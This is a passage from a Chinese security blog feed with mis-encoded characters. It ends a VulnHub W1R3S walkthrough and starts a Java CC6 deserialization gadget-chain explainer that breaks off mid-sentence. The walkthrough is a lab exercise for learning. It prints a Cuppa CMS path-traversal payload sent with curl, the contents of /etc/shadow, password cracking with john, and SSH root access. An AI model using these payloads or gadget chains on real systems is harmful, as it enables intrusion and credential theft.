åˆ©ç”¨æ¼æ´è„šæœ¬æ‰«æï¼Œå¯èƒ½è¿˜ä¼šæœ‰ipv6çš„æ‰«æ</p><p>åŒ¿åç™»å½•</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ftp 192.168.205.136</span><br><span class="line">Connected to 192.168.205.136.</span><br><span class="line">220 Welcome to W1R3S.inc FTP service.</span><br><span class="line">Name (192.168.205.136:kali): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ³¨æ„ftpè¦åˆ‡æ¢æˆäºŒè¿›åˆ¶æ¨¡å¼ </p><p>å‘ç°ä¸‰ä¸ªç›®å½•</p><p>drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content<br>drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs<br>drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees</p><p>åˆ†åˆ«è¿›å…¥ç›®å½•å°†é‡Œé¢çš„txtæ–‡ä»¶ä¸‹è½½ä¸‹æ¥</p><p>å°†ä¸‹è½½çš„æ–‡ä»¶å…¨éƒ¨è¯»å–å‡ºæ¥</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat *.txt        </span><br><span class="line">New FTP Server For W1R3S.inc</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line">01ec2d8fc11c493b25029fb1f47f39ce</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###########################################</span></span></span><br><span class="line">___________.__              __      __  ______________________   _________    .__               </span><br><span class="line">\__    ___/|  |__   ____   /  \    /  \/_   \______   \_____  \ /   _____/    |__| ____   ____  </span><br><span class="line">  |    |   |  |  \_/ __ \  \   \/\/   / |   ||       _/ _(__  &lt; \_____  \     |  |/    \_/ ___\ </span><br><span class="line">  |    |   |   Y  \  ___/   \        /  |   ||    |   \/       \/        \    |  |   |  \  \___ </span><br><span class="line">  |____|   |___|  /\___  &gt;   \__/\  /   |___||____|_  /______  /_______  / /\ |__|___|  /\___  &gt;</span><br><span class="line">                \/     \/         \/                \/       \/        \/  \/         \/     \/ </span><br><span class="line">The W1R3S.inc employee list</span><br><span class="line"></span><br><span class="line">Naomi.W - Manager</span><br><span class="line">Hector.A - IT Dept</span><br><span class="line">Joseph.G - Web Design</span><br><span class="line">Albert.O - Web Design</span><br><span class="line">Gina.L - Inventory</span><br><span class="line">Rico.D - Human Resources</span><br><span class="line"></span><br><span class="line">â€‹    Ä± pou,Ê‡ Ê‡É¥Ä±uÊ Ê‡É¥Ä±s Ä±s Ê‡É¥Ç ÊÉÊ Ê‡o É¹ooÊ‡Â¡</span><br><span class="line"></span><br><span class="line">....punoÉ¹É ÆƒuÄ±ÊÉ×Ÿd doÊ‡s â€˜op oÊ‡ ÊÉ¹oÊ ÉŸo Ê‡o×Ÿ É ÇÊŒÉÉ¥ ÇÊ</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨hash-identifier å¯¹åŠ å¯†ç®—æ³•è¿›è¡Œè¯†åˆ«</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hash-identifier </span><br><span class="line"></span><br><span class="line">Possible Hashs:</span><br><span class="line">[+] MD5</span><br><span class="line">[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))</span><br></pre></td></tr></table></figure><p>è¯†åˆ«å‘Šè¯‰æˆ‘æ˜¯md5</p><p>ç½‘ç«™è¿›è¡Œè§£ç </p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/90846274a1ac666ce6acec9ef9150df.png"></p><p>This[ç©ºæ ¼]is[ç©ºæ ¼]not[ç©ºæ ¼]a[ç©ºæ ¼]password</p><p>æç¤ºè¿™ä¸æ˜¯å¯†ç </p><p>å¯¹è¿™é‡Œé¢çš„base64è¿›è¡Œè§£å¯†</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==</span><br><span class="line">&quot;|base64 -d</span><br><span class="line">It is easy, but not that easy..</span><br></pre></td></tr></table></figure><p>å·¦è„‘æ”»å‡»å³è„‘ </p><p>The W1R3S.inc employee list</p><p>Naomi.W - Manager<br>Hector.A - IT Dept<br>Joseph.G - Web Design<br>Albert.O - Web Design<br>Gina.L - Inventory<br>Rico.D - Human Resources</p><p>å‘˜å·¥ä¿¡æ¯ å¾…ä¼šè¯´ä¸å®šæœ‰ç”¨è¿™é‡Œåˆ†å¥½äº†èŒä½</p><p>å¥½äº†ftpå°±æ˜¯è¿™äº›ä¿¡æ¯</p><p>å¯¹80ç«¯å£è¿›è¡Œæµ‹è¯•</p><p>webé¡µé¢æ²¡å‘ç°æœ‰ç”¨çš„ä¸œè¥¿</p><p>çˆ†ç ´ç›®å½•</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo gobuster dir -u http://192.168.205.136 --wordlist=/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br></pre></td></tr></table></figure><p>&#x2F;wordpress            (Status: 301) [Size: 322] [â€“&gt; <a href="http://192.168.205.136/wordpress/]">http://192.168.205.136/wordpress/]</a><br>&#x2F;javascript           (Status: 301) [Size: 323] [â€“&gt; <a href="http://192.168.205.136/javascript/]">http://192.168.205.136/javascript/]</a><br>&#x2F;administrator        (Status: 301) [Size: 326] [â€“&gt; <a href="http://192.168.205.136/administrator/]">http://192.168.205.136/administrator/]</a><br>&#x2F;server-status        (Status: 403) [Size: 303]</p><p>amdinistratorå¯ä»¥ç›´æ¥è¿›å…¥ æ˜¯ä¸ªcms</p><p>wordpressè¿›è¡Œä¸€ä¸ªè·³è½¬ åˆ°localhost&#x2F;wordpress&#x2F;</p><p>è¿™é‡Œä¸ç¡®å®šæ˜¯ä¸æ˜¯kaliç¯å¢ƒé—®é¢˜æ‰€ä»¥å…ˆå¯¹å¦ä¸€ä¸ªcmsè¿›è¡Œæµ‹è¯•</p><p>æµ‹è¯•å‡ºæ¥å‘ç°ä¸èƒ½è¿›è¡Œå®‰è£…</p><p>æŸ¥çœ‹å†å²æ¼æ´</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">earchsploit cuppa    </span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"></span><br><span class="line"> Exploit Title                                                                                                                                             |  Path</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"></span><br><span class="line">Cuppa CMS - &#x27;/alertConfigField.php&#x27; Local/Remote File Inclusion                                                                                            | php/webapps/25971.txt</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"></span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure><p>å‘ç°25971 ç»™ä»–ä¸‹è½½ä¸‹æ¥</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">earchsploit cuppa -m 25971</span><br><span class="line">[!] Could not find EDB-ID #</span><br><span class="line"></span><br><span class="line">  Exploit: Cuppa CMS - &#x27;/alertConfigField.php&#x27; Local/Remote File Inclusion</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/25971</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/php/webapps/25971.txt</span><br><span class="line">    Codes: OSVDB-94101</span><br><span class="line"> Verified: True</span><br><span class="line">File Type: C++ source, ASCII text, with very long lines (876)</span><br><span class="line">Copied to: /home/kali/Desktop/w1r3s/25971.txt</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‘ç°åˆ©ç”¨æ–¹å¼æ˜¯æ–‡ä»¶åŒ…å«æˆ‘ä»¬çœ‹ä»–ç»™çš„payloadèƒ½ä¸èƒ½æµ‹è¯•æˆåŠŸ</p><p>å‘ç°æ˜¯ä¸è¡Œçš„ </p><p>è’‹cuppré‚£ä¿®æ”¹ä¸‹ æˆadministrator</p><p>å‘ç°æ˜¯ç”±å›æ˜¾ä½†æ˜¯æ²¡æœ‰çˆ†å‡ºå†…å®¹</p><p><a href="http://192.168.205.136/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.205.136/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a></p><p>è¿™ä¸ªæ—¶å€™è€ƒè™‘æ˜¯ä¸æ˜¯åˆ©ç”¨POSTçš„æˆ–æ˜¯å…¶ä»–çš„ä¸œè¥¿ </p><p>curl â€“data-urlencode â€œurlConfig&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<br>â€œ <a href="http://192.168.205.136/administrator/alerts/alertConfigField.php">http://192.168.205.136/administrator/alerts/alertConfigField.php</a></p><p>å‘ç°åˆ—å‡ºpasswd ä¿¡æ¯</p><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥æŸ¥çœ‹shadow</p><p>å¾—åˆ°å¯†ç è¿›è¡Œç­›é€‰æœ‰å“ˆå¸Œå€¼çš„è´¦æˆ·</p><p>root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx.&#x2F;ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::</p><p>www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8&#x2F;0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::</p><p>w1r3s:$6$xe&#x2F;eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb&#x2F;io7x9q1iP.:17567:0:99999:7:::</p><p>å¾—åˆ°è¿™äº› æˆ‘ä»¬è¿›è¡Œå¯¹å“ˆå¸Œè¿›è¡Œè§£å¯†</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">john md5.hash </span><br><span class="line">Created directory: /home/kali/.john</span><br><span class="line">Warning: detected hash type &quot;sha512crypt&quot;, but the string is also recognized as &quot;HMAC-SHA256&quot;</span><br><span class="line">Use the &quot;--format=HMAC-SHA256&quot; option to force loading these as that type instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])</span><br><span class="line">Cost 1 (iteration count) is 5000 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">www-data         (www-data)     </span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst</span><br><span class="line">computer         (w1r3s)     </span><br><span class="line">Proceeding with incremental:ASCII</span><br></pre></td></tr></table></figure><p>è¿›è¡Œsshè¿œç¨‹ç™»å½•</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ssh w1r3s@192.168.205.136</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Think this is the way?</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Well,........possibly.</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">w1r3s@192.168.205.136&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">108 packages can be updated.</span><br><span class="line">6 updates are security updates.</span><br><span class="line"></span><br><span class="line">.....You made it huh?....</span><br><span class="line">Last login: Mon Jan 22 22:47:27 2018 from 192.168.0.35</span><br></pre></td></tr></table></figure><p>ç™»å½•æˆåŠŸå¯ä»¥ç›´æ¥sudoææƒ</p><p>è·å–flag</p><h2 id="root-W1R3S-cat-flag-txt"><a href="#root-W1R3S-cat-flag-txt" class="headerlink" title="root@W1R3S:~# cat flag.txt "></a>root@W1R3S:~# cat flag.txt </h2><hr><h2 id=""><a href="#" class="headerlink" title="  &#x2F; _&#x2F; _ | \ | |&#x2F; _|  _ \    &#x2F; |   | | | | |      &#x2F; |   | _&#x2F; _ | \ | &#x2F; _| | |  | | | |  | | |  | |) |  &#x2F; _ \ | | | | | | |     &#x2F; _ \ | |  | | | | |  | __ \ | || || | |\  | || |  _ &lt;  &#x2F; ___ | | | |_| | |_ &#x2F; ___ | |  | | || | |\  |) |  ____&#x2F;|| _|__|| _/_&#x2F;   __|  _&#x2F;|_____&#x2F;&#x2F;   __| |_&#x2F;|| _|____&#x2F;                                                                                         "></a>  &#x2F; <strong>_&#x2F; _ | \ | |&#x2F; <em>_<em>|  _ \    &#x2F; |</em>   <em>| | | | |      &#x2F; |</em>   <em>|</em> _&#x2F; _ | \ | &#x2F; <em>_<em>|<br> | |  | | | |  | | |  <em>| |</em>) |  &#x2F; _ \ | | | | | | |     &#x2F; _ \ | |  | | | | |  | _</em>_ \<br> | |</em><em>| |</em>| | |\  | |</em>| |  _ &lt;  &#x2F; ___ | | | |_| | |</strong>_ &#x2F; ___ | |  | | |<em>| | |\  |</em><strong>) |<br>  _</strong><em>___&#x2F;|</em>| _|_<em>_<em>|</em>| _/_&#x2F;   __|  _</em><em>&#x2F;|_____&#x2F;</em>&#x2F;   __| |<em><strong>_</strong>&#x2F;|</em>| _|____&#x2F;                                                                                         </h2><pre><code>                      .-----------------TTTT_-----_______                    /&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;(______O] ----------____  \______/]_ __...---&#39;&quot;&quot;&quot;\_ --&#39;&#39;   Q                               ___________@</code></pre><p> |â€™â€™â€™                   ._   _______________&#x3D;â€”â€”â€”â€œâ€â€â€â€â€â€<br> |                ..â€“â€™â€™|   l L |_l   |<br> |          ..â€“â€™â€™      .  &#x2F;-_<strong>j â€˜   â€˜<br> |    ..â€“â€™â€™           &#x2F;  ,       â€˜   â€˜<br> |â€“â€™â€™                &#x2F;           &#96;    <br>                      L</strong>â€˜         \    -<br>                                    -    â€˜-.<br>                                     â€˜.    &#x2F;<br>                                       â€˜-.&#x2F;</p><hr><h2 id="YOU-HAVE-COMPLETED-THE-INC-CHALLENGE-V-1-0"><a href="#YOU-HAVE-COMPLETED-THE-INC-CHALLENGE-V-1-0" class="headerlink" title="  YOU HAVE COMPLETED THE               __      __  ______________________   _________              &#x2F;  \    &#x2F;  /_   ______   _____  \ &#x2F;   &#x2F;              \   //   &#x2F; |   ||       &#x2F; (  &lt; __  \               \        &#x2F;  |   ||    |   /       /                        __&#x2F;\  &#x2F;   ||||  &#x2F;____  &#x2F;_______  &#x2F;.INC                     /                /       /        /        CHALLENGE, V 1.0"></a>  YOU HAVE COMPLETED THE<br>               __      __  ______________________   _________<br>              &#x2F;  \    &#x2F;  /_   ______   _____  \ &#x2F;   <strong><em><strong>&#x2F;<br>              \   //   &#x2F; |   ||       <em>&#x2F; <em>(</em></em>  &lt; _</strong></em>_  \<br>               \        &#x2F;  |   ||    |   /       /        <br>                __&#x2F;\  &#x2F;   |</strong><em>||</em><strong><em>|</em>  &#x2F;</strong>____  &#x2F;_______  &#x2F;.INC<br>                     /                /       /        /        CHALLENGE, V 1.0</h2><p>CREATED BY SpecterWires</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä¸‹è½½å¥½é¶æœº &lt;/p&gt;
&lt;p&gt;ç„¶åå…ˆåœ¨æœ¬åœ°è¿›è¡Œæ‰«æç¡®å®šé¶æœºçš„ipåœ°å€&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo nmap -sn 1</summary>
      
    
    
    
    
    <category term="vulnhub" scheme="https://gu0f3n.github.io/tags/vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>cc6</title>
    <link href="https://gu0f3n.github.io/2025/03/24/cc6/"/>
    <id>https://gu0f3n.github.io/2025/03/24/cc6/</id>
    <published>2025-03-24T11:21:15.000Z</published>
    <updated>2025-03-27T01:33:11.682Z</updated>
    
    <content type="html"><![CDATA[<p>   ä¹‹å‰å¤ç°äº†java cc1é“¾å­ </p><p>é¡ºä¾¿åœ¨è¿™è¿›è¡Œä¸€ä¸ªæ€»ç»“</p><h4 id="æ ¸å¿ƒæ­¦å™¨ï¼šåå°„ä¸‡èƒ½é’¥åŒ™ï¼ˆInvokerTransformerï¼‰"><a href="#æ ¸å¿ƒæ­¦å™¨ï¼šåå°„ä¸‡èƒ½é’¥åŒ™ï¼ˆInvokerTransformerï¼‰" class="headerlink" title="æ ¸å¿ƒæ­¦å™¨ï¼šåå°„ä¸‡èƒ½é’¥åŒ™ï¼ˆInvokerTransformerï¼‰"></a><strong>æ ¸å¿ƒæ­¦å™¨ï¼šåå°„ä¸‡èƒ½é’¥åŒ™ï¼ˆ<code>InvokerTransformer</code>ï¼‰</strong></h4><p><strong>æ¯”å–»</strong>ï¼š<code>InvokerTransformer</code>ç±»åƒä¸€æŠŠä¸‡èƒ½é’¥åŒ™ï¼Œèƒ½é€šè¿‡åå°„è°ƒç”¨ä»»ä½•æ–¹æ³•ã€‚æ¯”å¦‚ç”¨é’¥åŒ™æ‰“å¼€â€œRuntimeç±»â€çš„é”ï¼Œæ‰§è¡Œ<code>exec(&quot;calc&quot;)</code>å¼¹è®¡ç®—å™¨</p><h4 id="æµæ°´çº¿ç»„è£…ï¼šä¸²è”å·¥å…·äººï¼ˆChainedTransformerï¼‰"><a href="#æµæ°´çº¿ç»„è£…ï¼šä¸²è”å·¥å…·äººï¼ˆChainedTransformerï¼‰" class="headerlink" title="æµæ°´çº¿ç»„è£…ï¼šä¸²è”å·¥å…·äººï¼ˆChainedTransformerï¼‰"></a><strong>æµæ°´çº¿ç»„è£…ï¼šä¸²è”å·¥å…·äººï¼ˆ<code>ChainedTransformer</code>ï¼‰</strong></h4><p><strong>æ¯”å–»</strong>ï¼šä¸ºäº†ç»•è¿‡é™åˆ¶ï¼Œæ”»å‡»è€…éœ€è¦å¤šä¸ªâ€œå·¥å…·äººâ€åä½œã€‚<code>ChainedTransformer</code>å°±åƒä¸€ä¸ªæµæ°´çº¿ï¼ŒæŠŠå¤šä¸ªæ“ä½œä¸²è”èµ·æ¥ï¼š</p><p>å·¥å…·äººAï¼šå…ˆæ‹¿åˆ°<code>Runtime</code>å¯¹è±¡ï¼ˆ<code>ConstantTransformer</code></p><p>å·¥å…·äººBï¼šç”¨ä¸‡èƒ½é’¥åŒ™è°ƒç”¨<code>exec</code>æ–¹æ³•ï¼ˆ<code>InvokerTransformer</code>ï¼‰</p><p><strong>åŸç†</strong>ï¼šæŠŠè¿™ä¸¤ä¸ªå·¥å…·äººæŒ‰é¡ºåºæ”¾è¿›<code>ChainedTransformer</code>ï¼Œæ‰§è¡Œæ—¶ä¼šå…ˆè·å–<code>Runtime</code>å¯¹è±¡ï¼Œå†è°ƒç”¨<code>exec</code>æ–¹æ³•ã€‚</p><h4 id="è§¦å‘æœºå…³ï¼šæ”¹é€ åœ°å›¾ï¼ˆTransformedMapï¼‰"><a href="#è§¦å‘æœºå…³ï¼šæ”¹é€ åœ°å›¾ï¼ˆTransformedMapï¼‰" class="headerlink" title="è§¦å‘æœºå…³ï¼šæ”¹é€ åœ°å›¾ï¼ˆTransformedMapï¼‰"></a><strong>è§¦å‘æœºå…³ï¼šæ”¹é€ åœ°å›¾ï¼ˆ<code>TransformedMap</code>ï¼‰</strong></h4><p><strong>æ¯”å–»</strong>ï¼š<code>TransformedMap</code>æ˜¯ä¸€ä¸ªè¢«é­”æ”¹çš„åœ°å›¾ï¼Œå½“åœ°å›¾ä¸­çš„å€¼è¢«ä¿®æ”¹æ—¶ï¼ˆæ¯”å¦‚è°ƒç”¨<code>setValue</code>ï¼‰ï¼Œä¼šè‡ªåŠ¨è§¦å‘æµæ°´çº¿ä¸Šçš„å·¥å…·äºº</p><h4 id="ç‚¹ç«å¼€å…³ï¼šååºåˆ—åŒ–å…¥å£ï¼ˆAnnotationInvocationHandlerï¼‰"><a href="#ç‚¹ç«å¼€å…³ï¼šååºåˆ—åŒ–å…¥å£ï¼ˆAnnotationInvocationHandlerï¼‰" class="headerlink" title="ç‚¹ç«å¼€å…³ï¼šååºåˆ—åŒ–å…¥å£ï¼ˆAnnotationInvocationHandlerï¼‰"></a><strong>ç‚¹ç«å¼€å…³ï¼šååºåˆ—åŒ–å…¥å£ï¼ˆ<code>AnnotationInvocationHandler</code>ï¼‰</strong></h4><p><strong>æ¯”å–»</strong>ï¼š<code>AnnotationInvocationHandler</code>æ˜¯Javaè‡ªå¸¦çš„â€œå¿«é€’æ‹†åŒ…å‘˜â€ï¼Œååºåˆ—åŒ–æ—¶ä¼šè‡ªåŠ¨æ‰§è¡Œ<code>readObject</code>æ–¹æ³•ï¼ˆæ‹†åŒ…è£¹é€»è¾‘ï¼‰ã€‚æ”»å‡»è€…æŠŠé­”æ”¹åœ°å›¾å¡è¿›å®ƒçš„<code>memberValues</code>å±æ€§</p><p><strong>è§¦å‘æµç¨‹</strong>ï¼š</p><p>ååºåˆ—åŒ–æ—¶ï¼Œ<code>readObject</code>æ–¹æ³•éå†åœ°å›¾ä¸­çš„é”®å€¼å¯¹</p><p>éå†åˆ°æŸä¸ªé”®å€¼å¯¹æ—¶ï¼Œè°ƒç”¨<code>setValue</code>ä¿®æ”¹å€¼ï¼Œè§¦å‘é­”æ”¹åœ°å›¾çš„æœºå…³</p><ul><li>æœºå…³å¯åŠ¨æµæ°´çº¿å·¥å…·äººï¼Œæœ€ç»ˆå¼¹è®¡ç®—å™¨ã€‚</li></ul><h3 id="é«˜ç‰ˆæœ¬jdkçš„ä¿®æ”¹"><a href="#é«˜ç‰ˆæœ¬jdkçš„ä¿®æ”¹" class="headerlink" title="é«˜ç‰ˆæœ¬jdkçš„ä¿®æ”¹"></a>é«˜ç‰ˆæœ¬jdkçš„ä¿®æ”¹</h3><p>åœ¨jdk8u_71ä¹‹åï¼ŒAnnotationInvocationHandlerç±»è¢«é‡å†™äº†ï¼Œä¿®æ”¹äº†readObjectæ–¹æ³•ï¼Œé‡Œé¢æ²¡æœ‰äº†setValueæ–¹æ³•ã€‚</p><p>é€šè¿‡</p><p>ChainedTransformerçš„transformæ–¹æ³•çš„ç”¨æ³•ï¼Œå®šä½åˆ°LazyMapçš„getæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é€»è¾‘ </p><p>æ£€æŸ¥é”®æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨æ—¶åˆ›å»ºå€¼å¹¶å­˜å‚¨ï¼Œå­˜åœ¨æ—¶ç›´æ¥è¿”å›ã€‚</p><p>æ¥ç€å¯»æ‰¾å…¥å£ç‚¹</p><h3 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">    <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">           (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TiedMapEntryçš„hashCodeæ–¹æ³•è°ƒç”¨äº†getValueï¼ŒgetValueè°ƒç”¨äº†getæ–¹æ³•ï¼Œæ‰€ä»¥å¯ä»¥ç”¨TiedMapEntryçš„hashCodeæ–¹æ³•è°ƒç”¨LazyMapçš„getæ–¹æ³•</p><p>æ¥ä¸‹æ¥å¯»æ‰¾è°è°ƒç”¨äº†hashCodeæ–¹æ³•</p><h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><p>é€šè¿‡ä¹‹å‰å¯¹<a href="https://mp.weixin.qq.com/s/yby-SU4vfxPQFJdBS2TMtQ">URLDNSé“¾</a>çš„ç ”ç©¶å¯çŸ¥ï¼ŒHashMapçš„readObjectæ–¹æ³•æœ‰å¦‚ä¸‹è¿™è¡Œè¯­å¥</p><p>putVal(hash(key), key, value, false, false);</p><p>è€ŒHashMapçš„hashæ–¹æ³•è°ƒç”¨äº†hashCodeæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œkeyçš„å€¼æ˜¯ä»readObjectè·å–çš„</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–æ—¶å¯ä»¥ç”¨HashMapçš„putæ–¹æ³•ä¼ keyå’Œvalue</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hashMap.put(tiedMapEntry, <span class="string">&quot;1&quot;</span>);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯hashmapçš„putä¼šæå‰èµ°å®Œæµç¨‹ </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºHashMapçš„putæ–¹æ³•ä¼šå¯¼è‡´æå‰è°ƒç”¨hashæ–¹æ³•ï¼Œä»è€Œåœ¨åºåˆ—åŒ–å‰å°±å‘½ä»¤æ‰§è¡Œï¼Œæ‰€ä»¥è¿™é‡Œä¿®æ”¹ä¸€ä¸‹ä»£ç ã€‚</p><p>è¿™é‡Œé€‰æ‹©åœ¨æ–°å»ºLazyMapå¯¹è±¡çš„æ—¶å€™ï¼Œéšä¾¿ä¼ 